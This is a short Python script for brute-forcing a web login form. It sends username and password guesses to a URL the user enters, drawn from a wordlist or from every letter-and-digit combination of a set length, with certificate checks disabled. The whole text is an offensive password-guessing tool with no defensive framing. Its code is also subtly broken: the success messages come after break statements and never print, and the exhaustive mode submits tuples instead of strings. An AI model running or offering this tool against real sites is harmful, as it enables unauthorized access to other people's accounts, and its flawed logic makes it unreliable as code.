import requests as r
import warnings
import string
import itertools
warnings.filterwarnings("ignore")

l = input('URL: ')
fieldpwd='password'
fieldusr='username'
if input('Do you have a password list (y/n)? ').startswith('y'):
    with open('p.txt') as o:
        p = set(o.read().split('\n'))
        u = input('username: ')
    for i in p:
        if 'incorr' not in str(
                r.post(l, {fieldusr: u, fieldpwd: i}, verify=False).content):
            break
            print('password found: {}'.format(i))
else:
    le = int(input('pwd length: '))

    def f(l):
        yield from itertools.product(*([l] * le))
    ls = list(string.ascii_lowercase) + \
        list(string.ascii_uppercase) + list(map(str, range(0, 10)))
    b = 0
    u = input('username: ')
    for x in f(ls):
        if 'incorr' not in str(
                r.post(l, {fieldusr: u, fieldpwd: x}, verify=False).content):
            break
            print('password found: {}'.format(x))
